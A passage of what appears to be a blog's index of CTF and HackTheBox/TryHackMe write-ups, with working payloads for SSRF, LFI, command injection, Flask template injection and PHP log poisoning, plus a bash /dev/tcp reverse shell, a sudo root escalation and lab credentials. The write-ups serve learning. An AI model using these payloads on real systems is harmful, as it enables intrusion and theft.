可以點，然後發現在 `?path` 這個參數可以LFI也可以訪問其他伺服器。\n洩漏 `index.php` 之後發現有 `FLAG_HINT`，還有一個 ip 檢查，一個 flag 檢查\n\nindex.php:\n```php\nif ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {\n\n    // show path of the flag\n    die($_ENV['FLAG_HINT']);\n}\n\n\nif ($path = @$_GET['path']) {\n    $path = trim($path);\n\n    if (preg_match('/https?:\\/\\/([^s\\/]+)/i', $path, $g)) {\n        // resolve ip address\n        $ip = gethostbyname($g[1]);\n\n        // no local request\n        if ($ip == '127.0.0.1' || $ip == '0.0.0.0')\n            die('Do not request to localhost!');\n    }\n\n    // no flag in path\n    $path = preg_replace('/flag/i', '', $path);\n    if ($content = @file_get_contents($path, FALSE, NULL, 0, 1000)) {\n        // 由於他只讀 1000 bytes 所以無法讀到全部的內容\n```\n\n目標就變成先讀到 `FLAG_HINT`，然後看到他檢查 ip 是先用 `gethostbyname` 就可以用 `http://root@127.0.0.1/`用本地端 IP 讀取網頁\n詳情請參考橘子大大的 talk: [link](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)\n再利用 `php://filter` 來避免被 flag filter 掃到，最後的 `FLAG_HINT` 是 `FLAG_14d65189669f05d206764c9de441474d.txt`，直接訪問就可以得到 flag ，並且提示了 d1v1n6 deeper 這題\n\nFlag: `AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}`\n\n## d1v1n6 deeper\n根據 d1v1n6 得到的提示 `Find the other web server in the internal network.`，故猜測是在其他 ip 而不是 port。\n利用 LFI 可以讀到 `/etc/hosts`\n\n/etc/hosts:\n```\n10:40 $ curl http://pre-exam-web.ais3.org:10103/?path=../../../../../etc/hosts\n127.0.0.1   localhost\n::1 localhost ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n172.22.0.3  b7fba1715fe6\n```\n\n發現有 `172.22.0.3` 這一組內部 IP，在手動測試幾次之後會發現事實上有一個 IP `172.22.0.2` server 是 directory lister\n觀察了一下似乎是把 GET 參數丟進 bash 裡面跑 `ls`，但是一開始測試一直試不出來，到後面就決定先睡覺明天再說 XDD\n隔天再試之後發現可以利用 `';id;'` 就可以進行 command injection，但是如果 URL 有空格會失敗，所以我利用 `${IFS}` 來代替空格\n\nPayload: `';cat${IFS}index.php;'`\n\nFlag: `AIS3{y0u_4r3_4bl3_70_d1v3_d33p3r_n3x7_71m3}`\n\n\n# Reverse\n\n## Trivia\n\n開 IDA 就有結果了\n\nFlag: `AIS3{This_is_a_reallllllllllly_boariiing_challenge}`\n\n## Tsaibro\n兩組點點作為一組，然後逆向就有 flag 了\n\nFlag: `AIS3{y0u_4re_a_b1g_f4n_0f_tsaibro_n0w}`\n\n## HolyGrenade\n先給了一個 `pyc` 檔，用 `uncompyle2` 就可以得到原始碼了\n\nde_grenade.py:\n```python\n# uncompyle6 version 3.3.3\n# Python bytecode 3.7 (3394)\n# Decompiled from: Python 2.7.12 (default, Nov 12 2018, 14:36:49)\n# [GCC 5.4.0 20160609]\n# Embedded file name: HolyGrenade.py\n# Size of source mod 2**32: 829 bytes\nfrom secret import flag\nfrom hashlib import md5\n\ndef OO0o(arg):\n    arg = bytearray(arg, 'ascii')\n    for Oo0Ooo in range(0, len(arg), 4):\n        O0O0OO0O0O0 = arg[Oo0Ooo]\n        iiiii = arg[(Oo0Ooo + 1)]\n        ooo0OO = arg[(Oo0Ooo + 2)]\n        II1 = arg[(Oo0Ooo + 3)]\n        arg[Oo0Ooo + 2] = II1\n        arg[Oo0Ooo + 1] = O0O0OO0O0O0\n        arg[Oo0Ooo + 3] = iiiii\n        arg[Oo0Ooo] = ooo0OO\n\n    return arg.decode('ascii')\n\n\nflag += '0' * (len(flag) % 4)\nfor Oo0Ooo in range(0, len(flag), 4):\n    print(OO0o(md5(bytes(flag[Oo0Ooo:Oo0Ooo + 4])).hexdigest()))\n```\n\n並且題目也有給出程式輸出的 hash\n\nflag 每四個字拿去 hash，所以最後我用爆的 (hashd 自己手動慢慢代)\nPayload:\n```python\n#!/usr/bin/env python3\n\nfrom hashlib import md5\nimport sys\n\nhashd = \"5ae001ebd955475c867617bdb72e7728\"\n#hashd = \"d7939cb11edaa9b1fb05efb4e2946f75\"\n#hashd = \"f1e8fda6c3ff87e43905ea1690624c64\"\n#hashd = \"764d30cb4807c5a870a47b53be6cf662\"\n#hashd = \"9cedd8dee7b5b87838d7a9bed76df8e5\"\n#hashd = \"7d1c09bbf2025facf6bd0fec0ec6a780\"\n#hashd = \"33e4500b205b80e52dd52e796cba8b7d\"\n\nalpha = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\"\n\n\ndef OO0o(arg):\n    arg = bytearray(arg, 'ascii')\n    for i in range(0, len(arg), 4):\n        a = arg[i]\n        b = arg[(i + 1)]\n        c = arg[(i + 2)]\n        d = arg[(i + 3)]\n        arg[i + 2] = d\n        arg[i + 1] = a\n        arg[i + 3] = b\n        arg[i] = c\n\n    return arg.decode('ascii')\n\n#FLAG => AIS3{...}00000..   padding to align 4n\n#\n#flag += '0' * (len(flag) % 4)\n#for i in range(0, len(flag), 4):\nfor i in alpha:\n    for k in alpha:\n        for j in alpha:\n            for m in alpha[-1]:\n                test = i+k+j+m\n                print(\"testing: \", test)\n                data = OO0o(md5(bytes(test, \"utf-8\")).hexdigest())\n                if data == hashd:\n                    sys.exit()\n```\n\nFlag: `AIS3{7here_15_the_k1ll3r_ra661t}`\n\n# Misc\n## KcufsJ\n如題目名，是 KcufsJ (x\n事實上就是 jsfuck ，只不過把 jsfuck 的內容倒過來\n利用 linux 的 `rev` 指令，直接把檔案的每一個字都顛倒，再拿去 devtool 執行就好了\n\nFlag: `AIS3{R33v33rs33_JSFUCKKKKKK}`\n\n## Welcome\n簽到題\n\n## Are you admin\n簡單來說就是 JSONI\n\nPayload:\n```\nYour name:\na\", \"is_admin\":\"yes\", \"test\":{\"a\":\"b\nYour age:\n\"}, \"1\":\"1\n```\n\nFlag: `AIS3{RuBy_js0n_i5_s0_w3ird_0_o}`\n\n## Pysh\n發現並沒有過濾 `$` 和大小寫，所以可以利用 `$SHELL` 來執行任意指令\n\nFlag: `AIS3{read;$REPLY}`\n\n## Crystal Maze\n\n就....手動硬幹 XDD\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\nr = remote('pre-exam-chals.ais3.org', 10202)\n\nchoice = {\"1\": \"left\", \"2\": 'right', '3': 'up', '4': 'down'}\n\nroute = [2, 3, 3, 3, 3, 1, 3, 3, 2, 2, 2, 4, 4, 4, 4, 4, 4, 2, 2, 2, 3, 2, 3, 2, 2, 2, 2, 3, 3, 2, 2, 4, 4, 4, 2, 2, 3, 3, 3, 3, 3, 3, 1, 3, 3, 2, 3, 3, 3, 3, 3, 3]\n\nfor i in route:\n    r.sendlineafter('move: ', choice[str(i)])\n    print r.recv()\n```\n\n\nFlag: 我忘記留了 QQ\n\n","categories":["writeup","AIS3","2019"]},{"title":"nisra-flask","url":"/en/2020/nisra-flask/","content":"\n\n\n## Description\n```\n{{Hi}}\nlab.nisra.net:8787\n```\n\n## Challenge\nBy viewing the challenge url, we can immediately see the source code.\n<!-- more -->\n```python\nimport flask\nimport os\n\n\napp = flask.Flask(__name__)\napp.config['FLAG'] = os.environ.pop('FLAG')\napp.config['FLASK_DEEPER'] = os.environ.pop('FLASK_DEEPER')\n\n@app.route('/')\ndef index():\n    return flask.render_template('index.html', content=open(__file__).read())\n\n@app.route('/dalun/<path:dalun>')\ndef dalun(dalun):\n    def waf(s):\n        s = s.replace('(', '').replace(')', '')\n        blacklist = ['config', 'self','url_for','request','session','get_flashed_messages']\n        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s\n    return flask.render_template_string(waf(dalun))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nAs you can see, the exploit should be in `/dalun/<payload>`.\n\nFYI, this is also a modified version for `TWCTF 2018 Shrine`\n\n### Investigate\nIn the source code, you should notice that it bans function calls and `most` of the template variables.\n\nBUT NOT ALL OF THEM THO.\n\nAccording to the [Flask Docs](https://flask.palletsprojects.com/en/1.1.x/templating/#standard-context), one variable is missing from the blacklist. `g`.\n(I asked the author of this challenge, and turns out this is not the intended solution lol)\n\n### Code-Review\nHere is the source code of `g`\n```python\ndef __repr__(self):\n        top = _app_ctx_stack.top\n        if top is not None:\n            return f\"<flask.g of {top.app.name!r}>\"\n        return object.__repr__(self)\n```\nIn the magic method `__repr__` of `g`, there's a `_app_ctx_stack` avaliable in the method.\n\nAnd, testing on the website, we can get the `__repr__` attribute by using `g.__repr__.__class__.__dict__`\n\nResult:\n```\n{'__repr__': <slot wrapper '__repr__' of 'method' objects>, '__hash__': <slot wrapper '__hash__' of 'method' objects>, '__call__': <slot wrapper '__call__' of 'method' objects>, '__getattribute__': <slot wrapper '__getattribute__' of 'method' objects>, '__setattr__': <slot wrapper '__setattr__' of 'method' objects>, '__delattr__': <slot wrapper '__delattr__' of 'method' objects>, '__lt__': <slot wrapper '__lt__' of 'method' objects>, '__le__': <slot wrapper '__le__' of 'method' objects>, '__eq__': <slot wrapper '__eq__' of 'method' objects>, '__ne__': <slot wrapper '__ne__' of 'method' objects>, '__gt__': <slot wrapper '__gt__' of 'method' objects>, '__ge__': <slot wrapper '__ge__' of 'method' objects>, '__get__': <slot wrapper '__get__' of 'method' objects>, '__new__': <built-in method __new__ of type object at 0x7f3743edfb00>, '__reduce__': <method '__reduce__' of 'method' objects>, '__func__': <member '__func__' of 'method' objects>, '__self__': <member '__self__' of 'method' objects>, '__doc__': <attribute '__doc__' of 'method' objects>}\n```\n\nNotice that we now have `__func__` which can get the current function running.\n\nWe look in to `__func__` by using `g.__repr__.__func__.__class__.__dict__`\n\nResult:\n```\n{'__repr__': <slot wrapper '__repr__' of 'function' objects>, '__call__': <slot wrapper '__call__' of 'function' objects>, '__get__': <slot wrapper '__get__' of 'function' objects>, '__new__': <built-in method __new__ of type object at 0x7f3743eebda0>, '__closure__': <member '__closure__' of 'function' objects>, '__doc__': <member '__doc__' of 'function' objects>, '__globals__': <member '__globals__' of 'function' objects>, '__module__': <member '__module__' of 'function' objects>, '__code__': <attribute '__code__' of 'function' objects>, '__defaults__': <attribute '__defaults__' of 'function' objects>, '__kwdefaults__': <attribute '__kwdefaults__' of 'function' objects>, '__annotations__': <attribute '__annotations__' of 'function' objects>, '__dict__': <attribute '__dict__' of 'function' objects>, '__name__': <attribute '__name__' of 'function' objects>, '__qualname__': <attribute '__qualname__' of 'function' objects>}\n```\n\nAND WE GOT `__globals__`!!\n\nSo `g.__repr__.__func__.__globals__` should got `_app_ctx_stack`.\n\n\n## Get Flag\nBecause we now having `_app_ctx_stack`, we now can get the app config.\n`g.__repr__.__func__.__globals__._app_ctx_stack.top.app.config`\n\n\n```\n<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'FLAG': 'NISRA{<cencored>}', 'FLASK_DEEPER': '<censored>'}>\n```\n\n\nAnd because this is not intended solution, we can reuse this payload in flask-deeper.","categories":["writeup","wargame","NISRA Enlightment 2020","Flask"]},{"title":"thm-dogcat","url":"/en/2020/thm-dogcat/","content":"\n\n\n## Recon\n\n### Nmap\n```\n$ nmap -A 10.10.246.103\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 19:45 CST\nNmap scan report for 10.10.246.103\nHost is up (0.29s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)\n|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)\n|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: dogcat\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\nJust some usual services.\n\nWith the description on the THM dashboard, we could assume this is a PHP-related bug.\n\n### Website\nSo by clicking every button on the website we should see the URL like this `http://10.10.246.103/?view=dog`.\nWith my experience, this could leads to LFI, but it's just a guess.\n\nFirst, we can make `view` argument in to a array by sending this `?view[]=1`, AND THE SERVER RESPOND WITH ERROR MEESSAGE LOL.\n{% asset_img web_error.png %}\n\nWe can analyze the error message.\n\n1. strpos failed. so it checks if the value have `dog` or `cat`\n2. the php script includes `Array.php` hmmmm :thinking:\nBecause we sent a array, so the value to string is `Array`.\n\nSo we can confirm that we have a LFI!\n\n## Get RCE\n\n### LFI\nFirst we can try if we can perform a LFI attack.\n\nAfter trying some payload, we can read source code with this payload `?view=php://filter/convert.base64-encode/resource=dog/../index`\n\nDecode the response we got these code. We can see that there is a extra param `ext`, which control the extension we include. So if we set `ext` to a blank value, it can read everything, not just php file.\n```php\n<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>dogcat</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/style.css\">\n</head>\n\n<body>\n    <h1>dogcat</h1>\n    <i>a gallery of various dogs or cats</i>\n\n    <div>\n        <h2>What would you like to see?</h2>\n        <a href=\"/?view=dog\"><button id=\"dog\">A dog</button></a> <a href=\"/?view=cat\"><button id=\"cat\">A cat</button></a><br>\n        <?php\n            function containsStr($str, $substr) {\n                return strpos($str, $substr) !== false;\n            }\n            $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';\n            if(isset($_GET['view'])) {\n                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {\n                    echo 'Here you go!';\n                    include $_GET['view'] . $ext;\n                } else {\n                    echo 'Sorry, only dogs or cats are allowed.';\n                }\n            }\n        ?>\n    </div>\n</body>\n\n</html>\n```\n\n\nSo, we got the source code, than came up with this `?view=dog/../../../../../../../../etc/passwd&ext=`, and it did return the passwd file. LFI really works.\n\n\nAnd here, I try to read access.log from apache2, because we can control the User-Agent, and by using LFI, we can execute PHP code! After trying, the access.log is stored in the default path. we can try to get a RCE!\n\n\n### RCE\nWe can control User-Agent with `curl` command (this is faster, we don't need BurpSuite for this easy task.)\nI have a php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).\n\nWe can use `file_get_contents` and `file_put_contents` to download file.\n\n\nFirst, setup a http server on my laptop (I'm using python3's http.server) (And a nc server for reverse shell)\nPayload: `curl -A \"<?php file_put_contents('racterub.php', file_get_contents('http://10.2.30.75:8080/rev.php'))?>\" http://10.10.246.103/`\n\nAnd include the access.log should trigger the php code. In the terminal you should see something like this:\n{% asset_img send_reverse_shell.png %}\n\nBy accessing the uploaded file, we will get reverse shell in our terminal.\n{% asset_img shell.png %}\n\n## Flags\n\n### Get flag1\ncd to `/var/www/html` you can see the flag1 file.\n{% asset_img flag1.png %}\n\n### Get flag2\njust in `/var/www` you can also see the flag2 file.\n{% asset_img flag2.png %}\n\n### Get flag 3\nexecute `sudo -l` it says we can execute `/usr/bin/env` as root, so by checking on [GTFOBins](https://gtfobins.github.io/) we can do a privilege escalation with it.\n{% asset_img flag3.png %}\n\n### Get flag 4\nI stuck at this for a while, and find that in `/opt/backups` have a script that backup file and execute from host.\nAnd while you looking around in the filesystem you should see a `.dockerenv` file in the `/`, which means this is a docker container. And this backup script should be execute by host user.\nBecause, we got root, we can modify `backup.sh` to make a reverse shell.\n\nPayload:\n```bash\necho \"#!/bin/bash\\n/bin/bash -i >& /dev/tcp/10.2.30.75/8888 0>&1\\n\" > backup.sh\n```\n\nAnd we open a nc server and wait host to execute the backup script, and we got flag 4!\n\n{% asset_img flag4.png %}\n\n\n\n","categories":["writeup","pentest","thm","dogcat"]},{"title":"htb-traceback","url":"/en/2020/htb-traceback/","content":"\n\n## Recon\n\n### Nmap\n\n```\nPORT   STATE  SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)\n|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)\n|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Help us\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n### Dir Fuzz\nPath fuzzing with `ffuf` and `dirsearch`, but both tool didn't find any :(\n\n\nThan I thought, there's a nickname called `Xh4H`, so I googled \"Xh4H webshell\", and found this tweet [link](https://twitter.com/riftwhitehat/status/1237311680276647936).\n\nAnd after few tries, there is a webshell called `smevk.php` on the server. LOL\n\n\n## Doing dirty stuff\n\n\n### Getting reverse shell\nSo we can upload a php shell to the server. Here I choose this webshell [Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), which can generate a reverse shell once you execute it.\n\nAnd we got a reverse shell with webadmin account!\n\n```\nLinux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n 07:15:23 up  1:22,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)\n/bin/sh: 0: can't access tty; job control turned off\n$\n```\n\n\n### Getting user\n\nInside `/home/webadmin` we have a `note.txt` and a `privesc.lua`.\n\nnote.txt, privesc.lua:\n```\n$ cat privesc.lua\nos.execute(\"/bin/sh\")\n$ cat note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\n```\n\nSo maybe using privesc.lua can make me to user account.\n\nDig deeper we can see `.bash_history`, someone is using executing privesc.lua with this command `sudo -u sysadmin /home/sysadmin/luvit privesc.lua`\n\nBy executing it, we got `sysadmin` account!\n\n```$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua\nsh: turning off NDELAY mode\nid\nuid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)\n```\n\n\n### Getting root\n\nExecuting `ps -aux` serveral times, there's a process like this.\n\n```\nroot      11790  0.0  0.0   4628   824 ?        Ss   07:23   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\n```\n\n`update-motd.d` is a banner for welcoming login users (as well as ssh users).\n\nBecause `update-motd.d` is running with root permission, and it can also execute command, we might steal root flag from here.\n\nFirst, we need to upload our ssh public key.\n\nSecond, append `cat /root/root.txt` to  `update-mote.d/00-header`\n\nThan, ssh to the machine, and we got root flag!","categories":["writeup","pentest","htb","traceback"]},{"title":"htb-blunder","url":"/en/2020/htb-blunder/","content":"\n\n## Recon\n\nScan ports with nmap first.\n\n### Nmap\n```\nPORT   STATE  SERVICE VERSION\n21/tcp closed ftp\n80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: Blunder\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Blunder | A blunder of interesting facts\n```\n\n### Dir Fuzz\nPath fuzzing with `ffuf` and `dirsearch`.\n\n```\nffuf\n\nabout                   [Status: 200, Size: 3280, Words: 225, Lines: 106]\n# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 7561, Words: 794, Lines: 171]\n0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]\nadmin                   [Status: 301, Size: 0, Words: 1, Lines: 1]\nusb                     [Status: 200, Size: 3959, Words: 304, Lines: 111]\nLICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]\n                        [Status: 200, Size: 7561, Words: 794, Lines: 171]\n\n\ndirsearch\n\n...\n[20:32:51] 200 -  563B  - /.gitignore\n...\n[20:33:27] 200 -    3KB - /about\n[20:33:38] 301 -    0B  - /admin  ->  http://10.10.10.191/admin/\n...\n[20:36:39] 200 -    1KB - /LICENSE\n[20:37:48] 200 -    3KB - /README.md\n...\n[20:45:31] 200 -  118B  - /todo.txt\n...\n```\n\nAfter fuzzing complete, we know there is a CMS called `bludit` and version is `3.9.2` (you can get version from css' version argument).\n\nWith this information we can search CVE and found this [CVE-2019-16113](cvedetails.com/cve/CVE-2019-16113/), and found the original writeup of this CVE [link](https://christa.top/details/46/) (which is written in chinese).\n\nThis exploit needs to be authencated. So we should find the CMS' account first.\n\n## Doing dirty stuff\n\n### Gaining access to CMS.\n\nDuring recon, i noticed that there's a `todo.txt` which mentioned a name called fergus, so we have two account name to bruteforce, fergus and admin. (admin is set by default in bludit). Also during recon, I found a script that allows me to bruteforce [link](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb). But using either admin and fergus as username and rockyou.txt as password list didn't success.\n\nWatching forum on htb, there's a hint that we should use CeWL, which can generate custon wordlist from website. And we got a ACCOUNT !! (fergus/RolandDeschain)\n\n### Having RCE\nUsing CVE that we previously found, we can upload `.htaccess` first to disable `RewriteEngine`, and we upload a php shell to the machine.\n\nWith php shell, we can persist our control by trying to get reverse shell. I'm using [python reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python). And we got a reverse shell with `www-data` account.\n\n```\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n```\n\n### Getting user\n\nPlaying in the machine, we can find there's a newer version of `bludit`. And I looked into bludit's github repo and found that there's a users.php inside `$bludit_path/bl-content/databases/` and you can see there's a account called `hugo` with the password hash. You can get the plaintext by searching online which is `Password120`\n\nSo we can use `su hugo` to get user account.\n\n```\n$ ls\nbludit-3.10.0a\nbludit-3.9.2\nhtml\n$ pwd\n/var/www\n```\n```\n$ cat users.php\n<?php defined('BLUDIT') or die('Bludit CMS.'); ?>\n{\n    \"admin\": {\n        \"nickname\": \"Hugo\",\n        \"firstName\": \"Hugo\",\n        \"lastName\": \"\",\n        \"role\": \"User\",\n        \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\",\n        \"email\": \"\",\n        \"registered\": \"2019-11-27 07:40:55\",\n        \"tokenRemember\": \"\",\n        \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\",\n        \"tokenAuthTTL\": \"2009-03-15 14:00\",\n        \"twitter\": \"\",\n        \"facebook\": \"\",\n        \"instagram\": \"\",\n        \"codepen\": \"\",\n        \"linkedin\": \"\",\n        \"github\": \"\",\n        \"gitlab\": \"\"}\n}\n```\n\n\n### Getting root\n\nAfter changing account to hugo, we can't execute `sudo -l` because we didn't have proper pty terminal. By using `python -c 'import pty;pty.spawn(\"/bin/bash\")'` we can generate a valid pty terminal.\n\n```\n$ su hugo\nPassword: Password120\nwhoami\nhugo\n```\n\n\nExecuting `sudo -l` we have following response:\n\n```\nMatching Defaults entries for hugo on blunder:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser hugo may run the following commands on blunder:\n    (ALL, !root) /bin/bash\n```\n\nGoogling `(ALL, !root) /bin/bash`, we can gain root with this exploit `sudo -u#-1 /bin/bash`\n\n```\nhugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash\n<-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash\nroot@blunder:/var/www/bludit-3.10.0a/bl-content/databases# id\nid\nuid=0(root) gid=1001(hugo) groups=1001(hugo)\n```\n\n\nAnd here's the root!","categories":["writeup","pentest","htb","blunder"]},{"title":"AIS3 Pre-Exam 2020","url":"/zh-tw/2020/ais3-2020/","content":"\n\n臨時決定參加 Pre-Exam，太久沒打了，什麼也沒準備\n名次也爛到自己不敢看\n\n寫點 writeup，記錄自己有多爛\n\n<!-- more -->\n\n## Crypto\n\n### Brontosaurus\n\n跟去年的 `kcufSJ` 同題型\n\n就把資料 reverse 之後丟進 chrome 的 console 就好了\n\nFlag:\n{% asset_img brontosaurus_flag.png %}\n\n### T-Rex\n\n建表之後查表就可以拿到 flag 了\n\nFlag:\n{% asset_img T-Rex_flag.png %}\n\n## Misc\n\n### Karuego\n下載下來的是一張照片，透過 `Binwalk` 可以得知他後面拼接了一個壓縮檔。透過 `dd` 將壓縮檔取出後發現已加密過了\n\n前面 `Binwalk` 的結果可以看到壓縮檔內有一個 `files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.png`。Google 過後找到同一張照片，最後使用 `pkcrack` 來爆密碼\n\nresult:\n{% asset_img karuego_pkcrack.png %}\n\n解壓縮檔案就可以看到有 flag 的照片了\nFlag:\n{% asset_img karuego_flag.png %}\n\n### Soy\n給了一張有污漬的 QR code。透過 QR code 可以容許缺資料的特性，盡可能地還原之後依舊可以讀取到 flag\n\n題目：\n{% asset_img soy_soy.png %}\n\nFlag:\n{% asset_img soy_flag.png %}\n\n## Reverse\n\n### FallenBeat\n題目是一個 jar 檔案，使用 JD-GUI 就可以反編譯了\n\n首先先在 `PanelEnding.class` 內找到 flag\n{% asset_img fallenbeat_flagarray.png %}\n\n接下來往下摸可以看到 flag 透過跟 cache 做 xor 之後就是我們要的 flag\n{% asset_img fallenbeat_flagxorcache.png %}\n\n往上摸看到 `cache` 是參數傳進來的，使用全域搜尋找到 `GameControl.class` 使用了這個函數\n{% asset_img fallenbeat_searchcache.png %}\n\n跟著看可以看到他是存某個檔每一行的數字，且檔名是參數傳進來的，再次用全域搜尋找到 `Frame.class` 使用了這個函數，可以看到檔案為 `songs/gekkou/hell.txt`\n\n接下來就是做一串處理就可以得到 flag 了\n\nFlag:\n{% asset_img fallenbeat_flag.png %}\n\n### TsaiBro\n跟去年差不多我就懶得寫了\n上 flag\n\nFlag:\n{% asset_img tsaibro_flag.png %}\n\n## Web\n\n### Elephant\n在 `CTFd` 上面有提示網頁有提示，開 devtool 就可以看到了\n{% asset_img elephant_hint.png %}\n\n看到提示 Source Code 就會想到 Git，但是回傳 Forbidden，賭他規則沒寫好，瀏覽 `/.git/HEAD` 就會發現他只有資料夾，檔案都沒擋到\n{% asset_img elephant_githead.png %}\n\n透過 GitHack 可以將原始碼下載下來\n{% asset_img elephant_sourcecode.png %}\n\n可以看到我們基本上是要做到 `canReadFlag()` 這個函式要回傳 1。\n這個時候 php 利用優秀的特性就可以做到了，當 `strcmp` 兩個型態不相同時會回傳 `0`，所以你可以改成 `NULL` 或是 `array`。\n\n在自己的機器上寫出相同的 Code ，只是將 `$this->token` 改成 NULL即可。\nExploit:\n{% asset_img elephant_exploit.png %}\n\nFlag:\n{% asset_img elephant_flag.png %}\n\n### Shark\n題目一開始就提示了 flag 在某個內網機器的 `/flag` 裡面\n{% asset_img shark_hint.png %}\n\n從 URL 就可以猜測漏洞為 LFI，測試結果也正確，查看 `/etc/hosts` 可以知道 `172.22.0.3` 是我們現在玩的機器的 IP，測試鄰近的 IP 可以發現 `172.22.0.2` 是一台 nginx server，瀏覽 `/flag` 即可拿到 flag\n{% asset_img shart_hosts.png %}\n\n\nFlag:\n{% asset_img shark_flag.png %}\n\n### Snake\n題目一進去就會給你原始碼，可以看到漏洞應該是 pickle 的部分\n{% asset_img snake_sourcecode.png %}\n\n透過下列 code 可以達成 RCE\n{% asset_img snake_exploit.png %}\n\n最後在 `/flag`得到 flag\n\nFlag:\n{% asset_img snake_flag.png %}\n\n### Squirrel\n看到網頁原始碼可以發現他是從 `api.php` 傳入一個絕對路徑，然後讀取資料，這就是一個很簡單的 LFI\n{% asset_img squirrel_webcode.png %}\n\n透過 LFI 看 api.php 的原始碼，可以發現他是直接用 `shell_exec(\"cat '$file'\")` 來讀檔案，exploit 就 `';cmd;'`即可。\n最後在 `/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`\n\nFlag:\n{% asset_img squirrel_flag.png %}\n","categories":["writeup","AIS3","2020"]},{"title":"TAMUCTF-2018","url":"/zh-tw/2018/tamuctf-2018/","content":"\n\n太多情境題了\nweb 